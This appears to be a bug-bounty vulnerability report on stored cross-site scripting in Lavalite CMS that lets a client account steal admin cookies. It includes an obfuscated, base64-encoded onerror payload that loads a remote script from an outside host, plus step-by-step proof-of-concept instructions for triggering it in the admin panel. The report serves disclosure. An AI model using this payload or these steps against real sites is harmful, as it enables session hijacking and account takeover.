# Description
Admin cookies and other details leading to an account take over to a higher level privilege from a client account of lavalite CMS and other multiple XSS in different pages due to acceptance of unsanitised data .check the permalinks to know more on the pages causing XSS.
# Payload USED
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
```
# POC For Account TakeOver
* login to client account and admin account from entirely different browsers or through a private mode.
* In the client account click on settings and update the address column with the blind payload and save the updates made.
* from the admin account move to the end point http://localhost/admin/user/client .
* Booyah!!! XSS triggered.
* other POC's are available at the corresponding PR pages
# PermaLinks
* [POC](https://drive.google.com/drive/folders/1QfRhBX54orE65lq6rM33Fchft_gsaMHI?usp=sharing)
* [ISSUE @ team page](https://github.com/418sec/huntr/pull/691)
* [issue @ contact creation and management page](https://github.com/418sec/huntr/pull/692)
* [issue @ roles page](https://github.com/418sec/huntr/pull/694)
* [issue @ permissions management page](https://github.com/418sec/huntr/pull/695)
* [issue @ manage blocks page](https://github.com/418sec/huntr/pull/696)
* [issue @ menu page](https://github.com/418sec/huntr/pull/697)
* [issue @ index management page](https://github.com/418sec/huntr/pull/705)
* [issue @ registration page](https://github.com/418sec/huntr/pull/693)
